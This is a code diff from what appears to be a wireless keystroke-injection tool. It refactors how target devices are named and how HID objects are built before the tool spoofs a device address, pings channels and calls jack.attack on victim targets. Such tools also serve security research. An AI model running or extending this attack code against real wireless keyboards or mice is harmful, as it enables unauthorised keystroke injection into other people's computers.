@@ -138,13 +138,17 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset):
                 pretty_devices = []
                 for key, device in devices.iteritems():
                     idx = idx + 1
+                    if device['device']:
+                        device_name = device['device'].description()
+                    else:
+                        device_name = 'Unknown'
                     pretty_devices.append([
                         idx,
                         key,
                         ",".join(str(x) for x in device['channels']),
                         device['count'],
                         str(datetime.timedelta(seconds=int(time.time() - device['timestamp']))) + ' ago',
-                        device['device'],
+                        device_name,
                         jack.hexify(device['payload'])
                     ])
 
@@ -180,17 +184,13 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset):
                 targets.append(devices[victim[1]])
 
         for target in targets:
-            payload = target['payload']
+            payload  = target['payload']
             channels = target['channels']
-            address = target['address']
-            device_type = target['device']
+            address  = target['address']
+            hid      = target['device']
 
             # Sniffer mode allows us to spoof the address
             jack.sniffer_mode(address)
-            hid = None
-
-            # Figure out what we've got
-            hid = jack.get_hid_from_payload(address, payload)
 
             if hid:
                 # Attempt to ping the devices to find the current channel
@@ -198,15 +198,15 @@ def cli(debug, script, lowpower, interval, layout, address, vendor, reset):
 
                 if lock_channel:
                     print(GR + '[+] ' + W + 'Ping success on channel %d' % (lock_channel,))
-                    print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, lock_channel))
-                    jack.attack(hid, attack)
+                    print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), hid.description(), lock_channel))
+                    jack.attack(hid(address, payload), attack)
                 else:
                     # If our pings fail, go full hail mary
                     print(R + '[-] ' + W + 'Ping failed, trying all channels')
                     for channel in channels:
                         jack.set_channel(channel)
-                        print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), device_type, channel))
-                        jack.attack(hid, attack)
+                        print(GR + '[+] ' + W + 'Sending attack to %s [%s] on channel %d' % (jack.hexify(address), hid.description(), channel))
+                        jack.attack(hid(address, payload), attack)
             else:
                 print(R + '[-] ' + W + "Target %s is not injectable. Skipping..." % (jack.hexify(address)))
                 continue
